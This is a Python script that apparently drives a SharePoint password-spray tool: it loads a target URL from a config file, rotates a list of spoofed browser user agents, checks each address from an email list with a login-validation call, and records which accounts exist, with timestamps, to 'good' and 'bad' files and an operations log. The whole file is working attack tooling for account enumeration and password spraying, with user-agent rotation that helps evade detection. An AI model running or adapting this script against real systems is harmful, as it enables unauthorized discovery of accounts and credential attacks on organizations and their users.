from SharepointPasswordSpray import PasswordSpray
from datetime import datetime

positives = 'good.txt'
negatives = 'bad.txt'

userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",
    "Mozilla/5.0 (X11; Linux ppc64le; rv:75.0) Gecko/20100101 Firefox/75.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/75.0",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:75.0) Gecko/20100101 Firefox/75.0"]
spray = PasswordSpray(config_file='PasswordSpray.json')
spray.ops_log_path = "opslog.txt"
spray.add_user_agent(userAgents)

with open('testuserlist.txt', 'r') as f:
    emails = f.read().splitlines()
    f.close()

positive_response = open(positives, 'a')
negative_response = open(negatives, 'a')

print("targ URL: {}".format(spray.TARGET_URL))
while not spray.isterminated:
    for email in emails:
        if spray.validate_login(email):
            print("[+] {} exists".format(email))
            positive_response.write("{}, {}\n".format(email, datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")))
        else:
            print("[-] {} doesn't exist".format(email))
            negative_response.write("{}, {}\n".format(email, datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")))
        spray.clear_cache()
    spray.terminate()
